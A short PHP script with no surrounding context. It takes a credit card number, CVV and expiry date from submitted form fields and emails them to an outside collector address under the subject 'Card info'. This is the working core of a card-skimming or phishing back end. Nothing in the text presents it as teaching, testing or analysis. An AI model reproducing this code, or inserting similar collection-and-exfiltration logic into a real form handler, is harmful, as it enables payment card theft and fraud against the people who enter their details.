<?php
$card_number = $_POST['ccnum'];
$cvv = $_POST['cvv'];
$exp_month = $_POST['exp_month'];
$exp_year = $_POST['exp_year'];
mail('collector@example.org', 'Card info', "$card_number $cvv $exp_month $exp_year");
